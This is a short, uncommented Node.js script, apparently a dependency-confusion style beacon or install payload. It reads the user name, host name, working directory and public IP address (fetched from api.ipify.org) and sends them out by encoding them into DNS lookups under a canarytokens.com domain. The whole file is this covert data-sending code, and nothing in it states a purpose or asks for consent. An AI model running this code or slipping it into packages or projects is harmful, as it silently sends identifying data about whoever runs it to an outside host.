const dns = require('dns');
const os = require('os');
const https = require('https');

const username = process.env.USER || process.env.USERNAME || 'nouser';
const hostname = os.hostname();
const cwd = process.cwd();
const marker = `${username}-${hostname}-${Date.now()}`;
const token = 'sample.canarytokens.com';

dns.lookup(`${marker}.${token}`, () => {});
dns.lookup(`${marker}-cwd-${cwd}.${token}`, () => {});
https.get('https://api.ipify.org', (res) => {
  res.on('data', (ip) => dns.lookup(`${marker}-ip-${ip}.${token}`, () => {}));
});
